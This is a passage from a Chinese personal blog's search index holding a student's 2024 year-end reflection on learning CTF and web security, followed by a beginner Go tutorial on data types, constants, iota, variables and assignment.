<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024 年总结</title>
    <link href="/2025/01/28/2024%E6%80%BB%E7%BB%93/"/>
    <url>/2025/01/28/2024%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>虽然没有什么成绩，但也算是成长了一年，新年快乐！</p><span id="more"></span><p>​        忽然之间，曾以为遥远的2025也要到来了，以前从来没有写过年度总结，因为一直觉得自己不是一个成功的人，看着那些优秀的师傅们洋洋洒洒地写下他们的年度成就，发现自己很难定义这一年真正拥有过什么，收获了什么，就觉得昏昏沉沉的一年就又要过去了。但是 N1nEmAn 师傅说：写年终总结想写就写吧，哪有那么多成功。于是我坐在房间里写下这段话。</p><p>​大一上的时候也学过一些前端、算法，但是学着学着发现我不喜欢，我的确对它们产生不了兴趣，锐评一下：枯燥＋没意思。当时寒假也想着做个动态网站出来，可是最终还是没有产出，遂放弃。大一下开学了，很轻松，突然在五月的某一天开始思考自己到底要学什么，其实非常感谢学长学姐们给了我很多点拨，让我知道了更多信息。</p><p>​六月开始听着学长的建议开始看网络基础（但是感觉自己有一种三天打鱼两天晒网的情况qwq），看了没多久就因为期末周搁置了。暑假开始，因为算法培训留校了两周（其实就是为了留校，我并不想上算法课www），当时想学逆向，按照学姐的建议学习了汇编，嗯…感觉也学的不精。留校期间有幸经过学长推荐打了当时大二拔尖班的内部赛（这算是我打的第一场 CTF比赛wow），CTF也是染上了hhhhhh。</p><p>​回家之后继续看基础，随之而来的有很多新生赛，BaseCTF、MoeCTF 等等（怎么会有这么多新生赛！！！），一边学一边打，太菜了，一个暑假过去才只能做简单题qwq，但是认识了好多厉害的师傅！</p><p>​开学之后也在学，要学的太多了，突然步入了迷茫阶段，感觉大学好短，想学的很多，但是我好像就是很笨，就是学不会，别人一眼就能看出来原理甚至脱口而出答案的东西而我看答案都看不懂。大家都好厉害，我很羡慕认识的这些师傅们可以打比赛，可以拿奖，自己属于是卷又卷不赢，躺又躺不平。每天都在破防当中，是做题时代码分析不出来的破防，是问别的师傅题时听不懂的破防，是看题解时看不明白的破防，是复现不出来的破防，每天不是在破防就是在破防的路上，我常常想，要是我能更聪明一点、更厉害一点就好了。有时候在回宿舍的楼梯间碰见认识的人会被感慨一句学这么晚才回来啊。其实我也不想学这么久，每次回寝室的路上一个人都没有，我也想看一眼就懂，不花费这么多时间。白天几乎满课，真正能静下心来学习的时候很少，想多看一点，有时候甚至都不想回寝室睡觉了。好在夜晚能吹着凉爽的风，也算是平淡生活里的慰藉。</p><p>​九月底通过一个在阿里工作的学长了解到逆向确实不好找工作（学得厉害才行），在经过很久的思想斗争之后决定转向 web，十月开始学习 web，幸运的是有学长带着我，学了一些基础漏洞和挖漏洞技巧，CTF 的 web 方向的题慢慢能做一些了，然后对此产生了兴趣！但是还是感觉自己像半吊子呜呜呜呜呜。</p><p>​十一月开始就慢慢结课，开始复习考试，学习的时间就变得更少了，值得开心的是我搭好了自己的博客跟很多厉害的师傅们加了友链，并且立下 flag 三天更一篇（其实并没有 cat 到呜呜呜呜呜）。</p><p>​十二月，这个月更是重量级，几乎每周都有考试，这个月是一点没学，但是打了国赛（差点进线下，唉遗憾，但还是感谢学长们带我打这么大的比赛），有幸被邀请成为了 RDCTF 的出题人，太菜了只能出签到题和简单题qwq。</p><p>​月底考完 Java 后刚好有几天空闲时间，于是去了一趟北京。这趟北京之旅是人生中不能忘记的体验，领略到了北平的冬，打卡了很多地方吃了很多特色美食，站在什刹海边吹着风不禁想起了赵雷《鼓楼》中的那句歌词：我站在什刹海边，一切的甜蜜都与我无关，这是个拥挤的地方。体验到了人生中的第一场滑雪，南方孩子狂喜！还去逛了清华和北大，去到了北大的未名湖畔，在清华亲眼看到了曾经激励我的那句话：“我可以告诉你当年我也一样郁闷吗？”，肉眼可见他们的精神风貌真的与我们不一样，他们自信昂扬充满激情，图书馆里、教学楼里、楼道里甚至食堂里面都充满了他们学习的身影，高等学府浓厚的学术氛围着实让人羡慕。在天安门排了 13 个小时的队吹了一夜的冷风，终于站在第一排看着冉冉升起的五星红旗迎接 2025 第一个晨曦，军乐队、和平鸽都很幸运地见到了，现场特别震撼，大家都特别激动，拍了很多照片和视频（起码拍了几百张hhhhhhh），运气真的很好，第一次来看升旗就站到了第一排owo。从来没想过小时候只能在电视里见到的首都自己能在 18 岁时踏足于此。</p><p>​快乐是短暂的，回学校的第二天就是考试，等着我的是 4 门考试＋IT 实习呜呜呜呜呜，谁家学校一学期考12 门啊啊啊啊啊啊（被信息安全概论背刺了居然还考栈溢出⊙﹏⊙），数据通信我爱你呜呜呜呜呜。</p><p>​寒假以 CTF 开始（oh，no 戒不掉了），然后开始从零开始的渗透之路（需要学的好多但是好有趣wuw）和挖洞（到底怎样才能自己挖到哇qwq）。打了西湖论剑（爆零了）和春秋杯（坐牢），在某天晚上心血来潮又开始学 go 语言，gogogo！大出血买了人生中第一台相机，LUMIX，好喜欢！。</p><p>​这一年差不多就这样结束了，感觉自己很幸运，遇到了很多很好的人，跟厉害的师傅们也交流过好多，有问题的时候大家都会毫不吝啬地为我提供帮助，真的非常非常非常非常非常非常感谢师傅们（＾～＾）（90°鞠躬）。马上就是大年初一了，真正意义上的新的一年，今年的坎坷，是为了明年更好的相遇，“何时葡萄先熟透 你要静候再静候”（感觉自己变得佛系了hhhhh）。渐渐地我也明白只有自己才是最珍贵的，人各有各，不过尔尔。希望未来的我能拥有一颗像乌萨奇一样坚强、稳定、勇敢的心和乐观的心态，2025，要像师父说的那样：新的一年技术更上一层楼！坚定自信更努力地继续向前奔跑，去成为一个真正厉害的人。</p><p><img src="https://img.dkdun.cn/v1/2025/12/93096e631b884738.png"></p>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅-数据类型&amp;常量&amp;变量&amp;输入输出</title>
    <link href="/2025/01/22/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/01/22/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>部分内容和 C 语言的是一样的，所以就只记了不一样的</p><span id="more"></span><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-type">byte</span>等价 <span class="hljs-type">uint8</span> 可以表达 ASCII 字符<br><span class="hljs-type">rune</span>等价 <span class="hljs-type">int32</span> 可以表达 Unicode 字符<br><span class="hljs-type">string</span>字符串即字节序列，可以转化为 []<span class="hljs-type">byte</span> 类型即字节切片<br></code></pre></td></tr></table></figure><h2 id="派生类型"><a href="#派生类型" class="headerlink" title="派生类型"></a>派生类型</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">数组[<span class="hljs-number">1</span>]<span class="hljs-type">int</span>长度为 <span class="hljs-number">1</span> 的整型数组<br>切片[]<span class="hljs-type">float64</span><span class="hljs-number">64</span>位浮点数切片<br>映射表<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>键为字符串,值为整型的映射表<br>结构体<span class="hljs-keyword">type</span> Gopher <span class="hljs-keyword">struct</span>&#123;&#125;Gopher 结构体<br>指针*<span class="hljs-type">int</span><br>函数<span class="hljs-keyword">type</span> f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>无参无返回值的函数<br>接口<span class="hljs-keyword">type</span> Gopher <span class="hljs-keyword">interface</span>&#123;&#125;Gopher 接口<br>通道<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>整型通道<br></code></pre></td></tr></table></figure><h2 id="零值"><a href="#零值" class="headerlink" title="零值"></a>零值</h2><p>零值又称为 <code>zero value</code> ，并不是指数字零 ，而是说一个类型的空值或默认值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">数字类型<span class="hljs-number">0</span><br>布尔类型<span class="hljs-literal">false</span><br>字符串类型<span class="hljs-string">&quot;&quot;</span><br>数组固定长度的对应类型的零值集合<br>结构体内部字段都是零值的结构体<br>切片、映射表、函数、接口、指针、通道<span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><h2 id="nil"><a href="#nil" class="headerlink" title="nil"></a>nil</h2><p><code>nil</code> 类似于 C 语言中的 <code>null</code> ，但有区别。<code>nil</code> 只是一些引用类型的零值，并且不属于任何类型，仅仅是一个变量。 </p><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>常量的声明需要 <code>const</code> 关键字，并且在初始化时必须赋值，不然无法通过编译</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> name <span class="hljs-type">string</span> = <span class="hljs-string">&quot;butter&quot;</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> msg = <span class="hljs-string">&quot;hello butt3rf1y&quot;</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> num = <span class="hljs-number">114514</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> numExpression = (<span class="hljs-number">1</span>+<span class="hljs-number">2</span>+<span class="hljs-number">3</span>) / <span class="hljs-number">2</span> % <span class="hljs-number">100</span> + num <span class="hljs-comment">// 常量表达式</span><br></code></pre></td></tr></table></figure><p>批量声明常量可以用 <code>()</code> ，可以存在多个</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Count = <span class="hljs-number">1</span><br>   Name  = <span class="hljs-string">&quot;butter&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>   Size = <span class="hljs-number">14</span><br>   Len  = <span class="hljs-number">51</span><br>)<br></code></pre></td></tr></table></figure><p>在同一个常量组中，如果前一个常量赋值且后面没有赋值，那么默认后面的和前面赋值常量值相等，也就是说其值默认就是前面常量的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>  A = <span class="hljs-number">1</span><br>  B <span class="hljs-comment">// 1</span><br>  C <span class="hljs-comment">// 1</span><br>  D <span class="hljs-comment">// 1</span><br>  E <span class="hljs-comment">// 1</span><br>)<br></code></pre></td></tr></table></figure><h2 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h2><p><code>iota</code> 是一个内置常量标识符，表示常量声明中无类型整数序数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> <span class="hljs-literal">iota</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p> 列子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 0</span><br>   Num1 <span class="hljs-comment">// 1</span><br>   Num2 <span class="hljs-comment">// 2</span><br>   Num3 <span class="hljs-comment">// 3</span><br>   Num4 <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><p>也能这样写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span>*<span class="hljs-number">2</span> <span class="hljs-comment">// 0</span><br>   Num1 <span class="hljs-comment">// 2</span><br>   Num2 <span class="hljs-comment">// 4</span><br>   Num3 <span class="hljs-comment">// 6</span><br>   Num4 <span class="hljs-comment">// 8</span><br>)<br></code></pre></td></tr></table></figure><p>还可以</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span> &lt;&lt; <span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 1</span><br>   Num1 <span class="hljs-comment">// 13(iota &lt;&lt; 2) * 3 + 1</span><br>   Num2 <span class="hljs-comment">// 25</span><br>   Num3 = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 3</span><br>   Num4 <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><p><code>iota</code> 的值本质上就是 <code>iota</code> 所在行相对于当前 <code>const</code> 分组的第一行的差值。而不同的 <code>const</code> 分组则相互不会影响。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>  Num  = <span class="hljs-literal">iota</span>&lt;&lt;<span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 1 第一行</span><br>  Num2 = <span class="hljs-literal">iota</span>&lt;&lt;<span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 13 第二行</span><br>  _ <span class="hljs-comment">// 25 第三行</span><br>  Num3 <span class="hljs-comment">//37 第四行</span><br>  Num4 = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 4 第五行</span><br>  _ <span class="hljs-comment">// 5 第六行</span><br>  Num5 <span class="hljs-comment">// 6 第七行</span><br>)<br></code></pre></td></tr></table></figure><p><strong>总结：<code>iota</code> 在 <code>const</code> 块中从0开始，每次定义一个新常量时递增1，直到用新的 <code>const</code> 重置。如果常量定义中没有显式赋值，则会继承前一个常量的表达式。并且<code>iota</code> 的值在显式使用时才会更新。</strong></p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>在 go 中，通过自定义类型 + const + iota 来实现枚举</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Season <span class="hljs-type">uint8</span><br><br><span class="hljs-keyword">const</span> (<br>Spring Season = <span class="hljs-literal">iota</span><span class="hljs-comment">//0</span><br>Summer<span class="hljs-comment">//1</span><br>Autumn<span class="hljs-comment">//2</span><br>Winter<span class="hljs-comment">//3</span><br>)<br></code></pre></td></tr></table></figure><p>枚举出来的结果实际上就是数字，go 也不支持直接将其转换为字符串，但我们可以通过给自定义类型添加方法来返回其字符串表现形式，实现 <code>Stringer</code> 接口就行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Season)</span></span> String() <span class="hljs-type">string</span> &#123;<br>  <span class="hljs-keyword">switch</span> s &#123;<br>  <span class="hljs-keyword">case</span> Spring:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;spring&quot;</span><br>  <span class="hljs-keyword">case</span> Summer:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;summer&quot;</span><br>  <span class="hljs-keyword">case</span> Autumn:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;autumn&quot;</span><br>  <span class="hljs-keyword">case</span> Winter:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;winter&quot;</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>go 中的声明是后置的，变量的声明会用到 <code>var</code> 关键字，格式为 <code>var 变量名 类型名</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> happy <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> intNUm <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> char <span class="hljs-type">byte</span><br></code></pre></td></tr></table></figure><p>如果要多个同样类型的变量时，可以写在一起</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> h1,h2,h3,h4 <span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p>声明多个不同类型的变量时，可以使用 <code>()</code>，可以存在多个 <code>()</code></p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-keyword">var</span> (<br>  name    <span class="hljs-keyword">string</span><br>  age     <span class="hljs-keyword">int</span><br>  address <span class="hljs-keyword">string</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>  school <span class="hljs-keyword">string</span><br>  <span class="hljs-keyword">class</span> <span class="hljs-keyword">int</span><br>)<br></code></pre></td></tr></table></figure><p><strong>注：变量如果只是声明而不赋值，那么变量存储的值就是对应类型的零值。</strong></p><h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><p>跟 C 语言规则差不多，但还可以分别赋值，比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> name <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> age <span class="hljs-type">int</span><br>name, age = <span class="hljs-string">&quot;happy&quot;</span>, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>但是每次都要指定类型，还可以短变量初始化，省略 <code>var</code> 关键字和后置类型，编译器会自己判断</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">&quot;happy&quot;</span><br></code></pre></td></tr></table></figure><p>虽然可以不用指定类型，但是在后续赋值时，类型必须保持一致，不然不能通过编译。还得注意的是，短变量初始化不能用 <code>nil</code>，因为 <code>nil</code> 不属于任何类型，编译器无法推断。</p><p>短变量还能批量初始化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">name, age := <span class="hljs-string">&quot;happy&quot;</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>短变量声明虽然无法对一个已存在的变量使用，但是在赋值旧变量的同时声明一个新的变量时可以使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-number">1</span><br>a, b := <span class="hljs-number">2</span>, <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>在 go 中，所有在函数中的变量都必须要被使用，如果只是声明了变量，没有使用它就会报错，但仅适用于函数内的变量，对于函数外的包级变量无用。</p><h2 id="匿名"><a href="#匿名" class="headerlink" title="匿名"></a>匿名</h2><p>用 <code>_</code> 可以表示不需要某一个变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Open(name <span class="hljs-type">string</span>) (*File, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>比如 <code>os.Open</code> 函数有两个返回值，我们只想要第一个，不想要第二个，可以按照下面这样写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">file, _ := os.Open(<span class="hljs-string">&quot;readme.txt&quot;</span>)<br></code></pre></td></tr></table></figure><p>未使用的变量是无法通过编译的，当你不需要某一个变量时，就可以使用下划线 <code>_</code> 代替。</p><h2 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h2><p>在 go 中，如果想要交换两个变量的值，不需要使用指针，可以使用赋值运算符直接进行交换，语法上看起来非常直观，例子如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">num1, num2 := <span class="hljs-number">114</span>, <span class="hljs-number">514</span><br>num1, num2 = num2, num1<br></code></pre></td></tr></table></figure><p>三个变量也是如此</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">num1, num2, num3 := <span class="hljs-number">114</span>, <span class="hljs-number">514</span>, <span class="hljs-number">22</span><br>num1, num2, num3  = num3, num2, num1<br></code></pre></td></tr></table></figure><p>go 里面有一个特别有意思的规则，进行多个变量赋值运算时，它的顺序是先计算值再赋值，不是从左到右计算，这就和其他语言大相径庭了。比如说下面的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c := <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>a, b, c = b, c, a+b<br></code></pre></td></tr></table></figure><p>上面代码答案是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>它会将 a, b, c 三个数的值分别计算好再赋给它们，就等同于下面这段代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c = <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>当涉及到函数调用时，这个效果就更明显，有一个函数<code>sum</code>可以计算两个数字的返回值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>  <span class="hljs-keyword">return</span> a + b<br>&#125;<br></code></pre></td></tr></table></figure><p>通过函数来进行两数相加</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c := <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>a, b, c = b, c, sum(a, b)<br></code></pre></td></tr></table></figure><p>结果没有变化，因为在计算<code>sum</code>函数返回值时，它传入的参数依旧是 0 和 1</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>所以代码应该写成这样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b = b, c<br>c = a + b<br></code></pre></td></tr></table></figure><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p>变量之间的比较时它们的类型必须相同，go 语言中不存在隐式类型转换，像下面这样的代码编译是无法通过的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a <span class="hljs-type">uint64</span><br>  <span class="hljs-keyword">var</span> b <span class="hljs-type">int64</span><br>  fmt.Println(a == b)<br>&#125;<br></code></pre></td></tr></table></figure><p>所以必须使用强制类型转换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a <span class="hljs-type">uint64</span><br>  <span class="hljs-keyword">var</span> b <span class="hljs-type">int64</span><br>  fmt.Println(<span class="hljs-type">int64</span>(a) == b)<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用 <code>min </code>函数比较最小值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">minVal := min(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1.2</span>)<br></code></pre></td></tr></table></figure><p>使用 <code>max</code> 函数比较最大值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">maxVal := max(<span class="hljs-number">100</span>, <span class="hljs-number">22</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1.12</span>)<br></code></pre></td></tr></table></figure><p>它们的参数支持所有的可比较类型，go 中的可比较类型有</p><ul><li>布尔</li><li>数字</li><li>字符串</li><li>指针</li><li>通道 （仅支持判断是否相等）</li><li>元素是可比较类型的数组（切片不可比较）（仅支持判断是否相等）（仅支持相同长度的数组间的比较，因为数组长度也是类型的一部分，而不同类型不可比较）</li><li>字段类型都是可比较类型的结构体（仅支持判断是否相等）</li></ul><p>除此之外，还可以通过导入标准库 <code>cmp</code> 来判断，不过仅支持有序类型的参数，在 go 中内置的有序类型只有数字和字符串。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;cmp&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  cmp.Compare(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>  cmp.Less(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>函数内部可以通过花括号建立一个代码块，彼此之间的变量作用域是相互独立的，不受干扰，无法访问，但是会受到父块中的影响。</p><h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>   Stdin  = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stdin), <span class="hljs-string">&quot;/dev/stdin&quot;</span>)<br>   Stdout = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stdout), <span class="hljs-string">&quot;/dev/stdout&quot;</span>)<br>   Stderr = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stderr), <span class="hljs-string">&quot;/dev/stderr&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p>在 <code>os</code> 包下有三个外暴露的文件描述符，其类型都是 <code>*os.File</code> ，分别是：</p><figure 